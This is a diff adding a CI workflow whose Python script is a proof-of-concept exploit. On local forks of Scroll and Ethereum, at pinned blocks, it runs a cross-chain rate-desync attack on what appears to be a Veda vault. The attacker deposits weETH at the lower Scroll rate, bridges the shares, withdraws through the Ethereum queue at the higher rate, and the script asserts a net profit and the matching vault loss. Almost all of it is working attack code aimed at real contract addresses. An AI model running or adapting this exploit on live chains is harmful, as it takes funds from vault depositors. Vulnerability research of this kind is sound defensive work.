@@ -1,0 +1,268 @@
+name: veda-scroll-eth-desync-poc-v2
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: foundry-rs/foundry-toolchain@v1
+        with:
+          version: stable
+      - name: Start pinned Scroll and Ethereum forks
+        shell: bash
+        run: |
+          set -euo pipefail
+          anvil --fork-url https://scroll-rpc.publicnode.com --fork-block-number 34473599 --port 8545 --silent >scroll-anvil.log 2>&1 &
+          echo $! > scroll.pid
+          anvil --fork-url https://ethereum-rpc.publicnode.com --fork-block-number 25612581 --port 8546 --silent >ethereum-anvil.log 2>&1 &
+          echo $! > ethereum.pid
+          for port in 8545 8546; do
+            for _ in $(seq 1 120); do
+              if cast chain-id --rpc-url "http://127.0.0.1:${port}" >/dev/null 2>&1; then break; fi
+              sleep 1
+            done
+            cast chain-id --rpc-url "http://127.0.0.1:${port}" >/dev/null
+          done
+      - name: Execute exact raw-share value-transfer path
+        shell: bash
+        run: |
+          python3 - <<'PY'
+          import json, subprocess, time, urllib.request, traceback
+
+          SCROLL='http://127.0.0.1:8545'
+          ETH='http://127.0.0.1:8546'
+          ATTACKER='0x1111111111111111111111111111111111111111'
+          ZERO='0x0000000000000000000000000000000000000000'
+          NATIVE='0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE'
+          VAULT='0xf0bb20865277aBd641a307eCe5Ee04E79073416C'
+          ACCOUNTANT='0x0d05D94a5F1E76C18fbeB7A13d17C8a314088198'
+          TELLER='0x9AA79C84b79816ab920bBcE20f8f74557B514734'
+          QUEUE='0x0D2dF071207E18Ca8638b4f04E98c53155eC2cE0'
+          SOLVER='0xe3F8fa039fF7A8Fe42fA2C6e9DC8565EcE6f7042'
+          SCROLL_WEETH='0x01f0a31698c4d065659b9bdc21b3610292a1c506'
+          ETH_WEETH='0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee'
+          ETH_EID=30101
+          SCROLL_EID=30214
+          ONE=10**18
+
+          def sh(*args):
+              p=subprocess.run([str(x) for x in args],text=True,capture_output=True)
+              if p.returncode: raise RuntimeError({'args':args,'stdout':p.stdout,'stderr':p.stderr})
+              return p.stdout.strip()
+          def sig(s): return sh('cast','sig',s)
+          def rpc(url,method,params,timeout=90):
+              body=json.dumps({'jsonrpc':'2.0','id':1,'method':method,'params':params}).encode()
+              req=urllib.request.Request(url,data=body,method='POST',headers={'content-type':'application/json','user-agent':'veda-desync-v2/1'})
+              with urllib.request.urlopen(req,timeout=timeout) as r: out=json.loads(r.read().decode())
+              if 'error' in out: raise RuntimeError({'method':method,'error':out['error']})
+              return out['result']
+          def h(x):
+              s=str(x or '')
+              return s[2:] if s.startswith('0x') else s
+          def word(v): return hex(int(v))[2:].rjust(64,'0')
+          def aw(a): return h(a).lower().rjust(64,'0')
+          def bw(x): return h(x).lower().ljust(64,'0')
+          def selector(s): return h(sig(s))
+          def enc_bytes(data_hex):
+              raw=h(data_hex); n=len(raw)//2
+              return word(n)+raw.ljust(((n+31)//32)*64,'0')
+          def call(url,to,data,frm=None,block='latest'):
+              tx={'to':to,'data':data}
+              if frm: tx['from']=frm
+              return rpc(url,'eth_call',[tx,block])
+          def uint_call(url,to,data,frm=None): return int(call(url,to,data,frm),16)
+          def addr_call(url,to,data): return '0x'+h(call(url,to,data))[-40:]
+          def balance(url,token,user): return uint_call(url,token,'0x'+selector('balanceOf(address)')+aw(user))
+          def send(url,sender,to,data,value=0):
+              rpc(url,'anvil_impersonateAccount',[sender]); rpc(url,'anvil_setBalance',[sender,hex(1000*10**18)])
+              tx={'from':sender,'to':to,'data':data,'gas':hex(20_000_000)}
+              if value: tx['value']=hex(value)
+              txh=rpc(url,'eth_sendTransaction',[tx])
+              for _ in range(400):
+                  rec=rpc(url,'eth_getTransactionReceipt',[txh])
+                  if rec:
+                      if int(rec['status'],16)!=1: raise RuntimeError({'failed_tx':txh,'receipt':rec})
+                      return rec
+                  time.sleep(.03)
+              raise RuntimeError('receipt timeout')
+          def gas_cost(rec):
+              return int(rec['gasUsed'],16)*int(rec.get('effectiveGasPrice','0x0'),16)+int(rec.get('l1Fee','0x0'),16)
+          def static_data(signature,*values):
+              out='0x'+selector(signature)
+              for typ,val in values:
+                  if typ=='address': out+=aw(val)
+                  elif typ in ('uint','uint16','uint24','uint32','uint64','uint96','uint128','uint256','bool'): out+=word(int(val))
+                  elif typ=='bytes32': out+=h(val).rjust(64,'0')
+                  else: raise ValueError(typ)
+              return out
+          def deposit_bridge_data(asset,amount,to,fee_token,max_fee):
+              bridge_word=word(ETH_EID)
+              head=[aw(asset),word(amount),word(0),aw(to),word(8*32),aw(fee_token),word(max_fee),aw(ZERO)]
+              return '0x'+selector('depositAndBridge(address,uint256,uint256,address,bytes,address,uint256,address)')+''.join(head)+enc_bytes('0x'+bridge_word)
+          def preview_fee_data(shares,to):
+              bridge_word=word(ETH_EID)
+              head=[word(shares),aw(to),word(4*32),aw(NATIVE)]
+              return '0x'+selector('previewFee(uint96,address,bytes,address)')+''.join(head)+enc_bytes('0x'+bridge_word)
+          def lz_receive_data(shares,to,peer,endpoint):
+              packed=(int(shares)<<160)|int(to,16)
+              msg='0x'+word(packed)
+              guid='0x'+'ab'*32
+              # static tuple is flattened: srcEid, sender, nonce, guid, msgOffset, executor, extraOffset
+              head=[word(SCROLL_EID),bw(peer),word(1),h(guid),word(7*32),aw(ATTACKER),word(7*32+64)]
+              return '0x'+selector('lzReceive((uint32,bytes32,uint64),bytes32,bytes,address,bytes)')+''.join(head)+enc_bytes(msg)+enc_bytes('0x')
+          def solve_data_payload(teller):
+              return '0x'+word(0)+aw(SOLVER)+aw(teller)+word(0)+word(0)
+          def solve_call_data(req,payload):
+              # args: dynamic tuple array, dynamic bytes, solver address
+              arr=word(1)+''.join([
+                  word(req['nonce']),aw(req['user']),aw(req['asset']),word(req['shares']),word(req['assets']),
+                  word(req['creation']),word(req['maturity']),word(req['deadline'])
+              ])
+              arr_off=3*32
+              bytes_off=arr_off+len(arr)//2
+              head=word(arr_off)+word(bytes_off)+aw(SOLVER)
+              return '0x'+selector('solveOnChainWithdraws((uint96,address,address,uint128,uint128,uint40,uint24,uint24)[],bytes,address)')+head+arr+enc_bytes(payload)
+          def get_block(url):
+              return rpc(url,'eth_getBlockByNumber',['latest',False])
+          def fetch_holders(token):
+              url=f'https://scroll.blockscout.com/api/v2/tokens/{token}/holders'
+              try:
+                  req=urllib.request.Request(url,headers={'accept':'application/json','user-agent':'veda-desync-v2/1'})
+                  with urllib.request.urlopen(req,timeout=45) as r: return json.loads(r.read().decode()).get('items',[])
+              except Exception: return []
+
+          out={'status':'STARTED','errors':[]}
+          try:
+              sb=get_block(SCROLL); eb=get_block(ETH)
+              out['blocks']={'scroll':int(sb['number'],16),'scroll_timestamp':int(sb['timestamp'],16),'ethereum':int(eb['number'],16),'ethereum_timestamp':int(eb['timestamp'],16)}
+              source_rate=uint_call(SCROLL,ACCOUNTANT,static_data('getRateInQuoteSafe(address)',('address',SCROLL_WEETH)))
+              dest_rate=uint_call(ETH,ACCOUNTANT,static_data('getRateInQuoteSafe(address)',('address',ETH_WEETH)))
+              out['rates']={'source_scroll':source_rate,'destination_ethereum':dest_rate,'edge_bps_1e6':(dest_rate-source_rate)*10_000_000_000//source_rate}
+              assert dest_rate>source_rate, out['rates']
+
+              share_lock=uint_call(SCROLL,TELLER,'0x'+selector('shareLockPeriod()'))
+              assert share_lock==0, share_lock
+              out_can_raw=call(SCROLL,TELLER,static_data('getAmountCanBeSent(uint32)',('uint32',ETH_EID)))
+              in_can_raw=call(ETH,TELLER,static_data('getAmountCanBeReceived(uint32)',('uint32',SCROLL_EID)))
+              out_can=int(h(out_can_raw)[64:128],16); in_can=int(h(in_can_raw)[64:128],16)
+              dest_liq=balance(ETH,ETH_WEETH,VAULT)
+              max_liq_shares=dest_liq*ONE//dest_rate
+              max_shares=min(out_can,in_can,max_liq_shares,(1<<96)-1)
+              target_amount=10*ONE
+              max_amount=max_shares*source_rate//ONE
+              amount=min(target_amount,max_amount*99//100)
+              assert amount>=ONE, {'amount':amount,'out_can':out_can,'in_can':in_can,'dest_liq':dest_liq}
+              expected_shares=amount*ONE//source_rate
+              expected_payout=expected_shares*dest_rate//ONE
+              assert expected_payout>amount
+              out['capacity']={'out_can_shares':out_can,'in_can_shares':in_can,'dest_weeth_liquidity':dest_liq,'chosen_amount':amount,'expected_shares':expected_shares,'expected_payout':expected_payout}
+
+              # Fund the attacker from a holder on the local fork only.
+              holder=None
+              for item in fetch_holders(SCROLL_WEETH):
+                  cand=(item.get('address') or {}).get('hash') or item.get('address_hash')
+                  if cand and balance(SCROLL,SCROLL_WEETH,cand)>=amount:
+                      holder=cand; break
+              if holder is None:
+                  assert balance(SCROLL,SCROLL_WEETH,VAULT)>=amount
+                  holder=VAULT
+              send(SCROLL,holder,SCROLL_WEETH,static_data('transfer(address,uint256)',('address',ATTACKER),('uint256',amount)))
+              source_vault_before=balance(SCROLL,SCROLL_WEETH,VAULT)
+              attacker_source_before=balance(SCROLL,SCROLL_WEETH,ATTACKER)
+              approve_src=send(SCROLL,ATTACKER,SCROLL_WEETH,static_data('approve(address,uint256)',('address',VAULT),('uint256',amount)))
+              fee=uint_call(SCROLL,TELLER,preview_fee_data(expected_shares,ATTACKER),ATTACKER)
+              dep=send(SCROLL,ATTACKER,TELLER,deposit_bridge_data(SCROLL_WEETH,amount,ATTACKER,NATIVE,fee),fee)
+              source_vault_after=balance(SCROLL,SCROLL_WEETH,VAULT)
+              attacker_source_after=balance(SCROLL,SCROLL_WEETH,ATTACKER)
+              source_gain=source_vault_after-source_vault_before
+              source_cost=attacker_source_before-attacker_source_after
+              assert source_gain==amount and source_cost==amount, {'source_gain':source_gain,'source_cost':source_cost}
+
+              # Authenticated destination delivery simulation at the exact historical destination block.
+              endpoint=addr_call(ETH,TELLER,'0x'+selector('endpoint()'))
+              peer='0x'+h(call(ETH,TELLER,static_data('peers(uint32)',('uint32',SCROLL_EID))))[-40:]
+              assert peer.lower()==TELLER.lower(), {'peer':peer,'expected':TELLER}
+              dest_shares_before=balance(ETH,VAULT,ATTACKER)
+              delivery=send(ETH,endpoint,TELLER,lz_receive_data(expected_shares,ATTACKER,TELLER,endpoint))
+              dest_shares_after=balance(ETH,VAULT,ATTACKER)
+              minted=dest_shares_after-dest_shares_before
+              assert minted==expected_shares, {'minted':minted,'expected':expected_shares}
+
+              # Public Ethereum queue request.
+              wa=h(call(ETH,QUEUE,static_data('withdrawAssets(address)',('address',ETH_WEETH))))
+              vals=[int(wa[i:i+64],16) for i in range(0,len(wa),64)]
+              allow=bool(vals[0]); maturity=vals[1]; min_deadline=vals[2]; min_discount=vals[3]; minimum_shares=vals[5]; withdraw_capacity=vals[6]
+              assert allow and expected_shares>=minimum_shares and withdraw_capacity>=expected_shares
+              discount=min_discount
+              deadline=max(min_deadline,86400)
+              required_assets=uint_call(ETH,QUEUE,static_data('previewAssetsOut(address,uint128,uint16)',('address',ETH_WEETH),('uint128',expected_shares),('uint16',discount)))
+              qnonce=uint_call(ETH,QUEUE,'0x'+selector('nonce()'))
+              approve_dst=send(ETH,ATTACKER,VAULT,static_data('approve(address,uint256)',('address',QUEUE),('uint256',expected_shares)))
+              latest_ts=int(get_block(ETH)['timestamp'],16)
+              rpc(ETH,'evm_setNextBlockTimestamp',[latest_ts+1])
+              reqrec=send(ETH,ATTACKER,QUEUE,static_data('requestOnChainWithdraw(address,uint128,uint16,uint24)',('address',ETH_WEETH),('uint128',expected_shares),('uint16',discount),('uint24',deadline)))
+              creation=int(rpc(ETH,'eth_getBlockByNumber',[reqrec['blockNumber'],False])['timestamp'],16)
+              req={'nonce':qnonce,'user':ATTACKER,'asset':ETH_WEETH,'shares':expected_shares,'assets':required_assets,'creation':creation,'maturity':maturity,'deadline':deadline}
+              rpc(ETH,'evm_increaseTime',[maturity+1]); rpc(ETH,'evm_mine',[])
+
+              # Honest authorized solver processing. The impersonation models protocol operation, not attacker privilege.
+              authority=addr_call(ETH,QUEUE,'0x'+selector('authority()'))
+              can_raw=call(ETH,authority,static_data('canCall(address,address,bytes4)',('address',SOLVER),('address',QUEUE),('bytes32','0x'+selector('solveOnChainWithdraws((uint96,address,address,uint128,uint128,uint40,uint24,uint24)[],bytes,address)'))))
+              # canCall's bytes4 is encoded in the high-order bytes; direct helper above right-pads bytes32, so use manual calldata.
+              can_data='0x'+selector('canCall(address,address,bytes4)')+aw(SOLVER)+aw(QUEUE)+h(sig('solveOnChainWithdraws((uint96,address,address,uint128,uint128,uint40,uint24,uint24)[],bytes,address)')).ljust(64,'0')
+              assert bool(int(call(ETH,authority,can_data),16))
+              attacker_dest_before=balance(ETH,ETH_WEETH,ATTACKER)
+              dest_vault_before=balance(ETH,ETH_WEETH,VAULT)
+              solve=send(ETH,SOLVER,QUEUE,solve_call_data(req,solve_data_payload(TELLER)))
+              attacker_dest_after=balance(ETH,ETH_WEETH,ATTACKER)
+              dest_vault_after=balance(ETH,ETH_WEETH,VAULT)
+              payout=attacker_dest_after-attacker_dest_before
+              dest_loss=dest_vault_before-dest_vault_after
+              assert payout==required_assets and dest_loss==required_assets, {'payout':payout,'required':required_assets,'dest_loss':dest_loss}
+
+              gross=payout-source_cost
+              global_vault_loss=dest_loss-source_gain
+              assert gross>0 and global_vault_loss==gross, {'gross':gross,'global_vault_loss':global_vault_loss}
+              try: weeth_rate=uint_call(ETH,ETH_WEETH,'0x'+selector('getRate()'))
+              except Exception: weeth_rate=ONE
+              gross_eth=gross*weeth_rate//ONE
+              attacker_gas=sum(gas_cost(x) for x in [approve_src,dep,approve_dst,reqrec])
+              conservative_net=gross_eth-fee-attacker_gas
+              out.update({
+                'status':'PASS_POSITIVE_FIXED_BLOCK_VALUE_TRANSFER',
+                'source':{'holder_used_for_local_seed':holder,'amount_paid_weeth':source_cost,'vault_gain_weeth':source_gain,'shares_bridged':expected_shares,'lz_native_fee_wei':fee,'deposit_gas_cost_wei':gas_cost(dep)},
+                'destination':{'shares_minted':minted,'queue_payout_weeth':payout,'vault_loss_weeth':dest_loss,'request':req,'delivery_gas_used':int(delivery['gasUsed'],16),'solve_gas_used':int(solve['gasUsed'],16)},
+                'economics':{'gross_profit_weeth':gross,'global_vault_loss_weeth':global_vault_loss,'weeth_rate_eth':weeth_rate,'gross_profit_eth_wei':gross_eth,'attacker_tx_gas_wei':attacker_gas,'native_lz_fee_wei':fee,'conservative_net_eth_wei':conservative_net}
+              })
+              assert conservative_net>0, out['economics']
+          except Exception as exc:
+              out['status']='FAIL'
+              out['errors'].append({'error':repr(exc),'traceback':traceback.format_exc()})
+          with open('veda-scroll-eth-desync-poc-v2.json','w') as f: json.dump(out,f,indent=2,sort_keys=True); f.write('\n')
+          print(json.dumps(out,indent=2,sort_keys=True))
+          if out['status']!='PASS_POSITIVE_FIXED_BLOCK_VALUE_TRANSFER': raise SystemExit(2)
+          PY
+      - name: Stop forks
+        if: always()
+        shell: bash
+        run: |
+          kill "$(cat scroll.pid)" 2>/dev/null || true
+          kill "$(cat ethereum.pid)" 2>/dev/null || true
+      - name: Upload strict fixed-block proof
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: veda-scroll-eth-desync-poc-v2
+          path: |
+            veda-scroll-eth-desync-poc-v2.json
+            scroll-anvil.log
+            ethereum-anvil.log
+          if-no-files-found: error
+          retention-days: 1
